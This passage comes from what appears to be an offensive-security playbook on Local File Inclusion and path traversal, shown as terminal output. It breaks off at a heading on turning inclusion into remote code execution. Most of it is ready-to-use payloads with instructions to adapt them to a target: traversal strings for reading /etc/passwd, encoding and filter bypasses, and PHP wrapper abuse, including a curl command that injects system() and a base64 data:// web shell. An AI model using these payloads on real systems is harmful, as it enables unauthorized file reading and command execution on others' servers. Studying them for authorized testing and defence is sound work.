[34m│[0m                                                                              [34m│[0m
[34m│[0m > **IMPORTANT:** All payloads in this playbook are EXAMPLES that must be     [34m│[0m
[34m│[0m MODIFIED for your specific target. Replace placeholders like                 [34m│[0m
[34m│[0m `{TARGET_FILE}`, `{FILE_PATH}`, `{DEPTH}`, `{ATTACKER_URL}` with actual      [34m│[0m
[34m│[0m values. Adapt payloads based on:                                             [34m│[0m
[34m│[0m > - Target operating system (Linux, Windows, etc.)                           [34m│[0m
[34m│[0m > - Web server and framework                                                 [34m│[0m
[34m│[0m > - File paths and directory structure                                       [34m│[0m
[34m│[0m > - PHP wrapper availability and filtering                                   [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ### LFI vs Path Traversal                                                    [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m - **Path Traversal:** Read arbitrary files (no code execution)               [34m│[0m
[34m│[0m - **File Inclusion:** Include files that get executed by the interpreter     [34m│[0m
[34m│[0m (potential RCE)                                                              [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ### Basic LFI Payloads                                                       [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **Standard traversal (adjust depth based on application path):**             [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m ?page=../../../etc/passwd                                                    [34m│[0m
[34m│[0m ?page=....//....//....//etc/passwd                                           [34m│[0m
[34m│[0m ?page=..\/..\/..\/etc/passwd                                                 [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ### Null Byte Bypass                                                         [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m For PHP < 5.3.4 when extension is appended:                                  [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m ?page=../../../etc/passwd%00                                                 [34m│[0m
[34m│[0m ?page=../../../etc/passwd%00.php                                             [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ### Double Encoding Bypass                                                   [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m When filter decodes once but backend decodes again:                          [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m ?page=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd            [34m│[0m
[34m│[0m ?page=%252e%252e%252fetc%252fpasswd%00                                       [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ### UTF-8 Overlong Encoding                                                  [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m ?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd                      [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ### Path Truncation                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m PHP truncates at 4096 bytes:                                                 [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m ?page=../../../etc/passwd............[ADD MORE DOTS TO 4096+]                [34m│[0m
[34m│[0m ?page=../../../etc/passwd\.\.\.\.\.\.[ADD MORE]                              [34m│[0m
[34m│[0m ?page=../../../etc/passwd/./././././.[ADD MORE]                              [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ### Filter Bypass Patterns                                                   [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **When ../ is stripped (recursive bypass):**                                 [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m ?page=....//....//etc/passwd                                                 [34m│[0m
[34m│[0m ?page=..///////..////..//////etc/passwd                                      [34m│[0m
[34m│[0m ?page=....\/....\/....\/etc/passwd                                           [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **Backslash variations:**                                                    [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m ?page=/%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd                        [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ### PHP Wrapper Exploitation                                                 [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **php://filter - Read source code:**                                         [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m ?page=php://filter/convert.base64-encode/resource={TARGET_FILE}              [34m│[0m
[34m│[0m ?page=php://filter/read=string.rot13/resource={TARGET_FILE}                  [34m│[0m
[34m│[0m ?page=php://filter/zlib.deflate/convert.base64-encode/resource={TARGET_FILE} [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **php://input - Code execution (POST body):**                                [34m│[0m
[34m│[0m ```bash                                                                      [34m│[0m
[34m│[0m curl -X POST --data "<?php system('id'); ?>" "{URL}?page=php://input%00"     [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **data:// - Inline code execution:**                                         [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m ?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=      [34m│[0m
[34m│[0m # Base64 of: <?php system($_GET['cmd']);?>                                   [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **expect:// - Direct command execution:**                                    [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m ?page=expect://id                                                            [34m│[0m
[34m│[0m ?page=expect://whoami                                                        [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **zip:// - Include from ZIP archive:**                                       [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m ?page=zip://uploads/shell.jpg%23payload.php                                  [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **phar:// - Include from PHAR archive:**                                     [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m ?page=phar:///var/www/html/archive.phar/test.txt                             [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ### LFI to RCE Techniques                                                    [34m│[0m
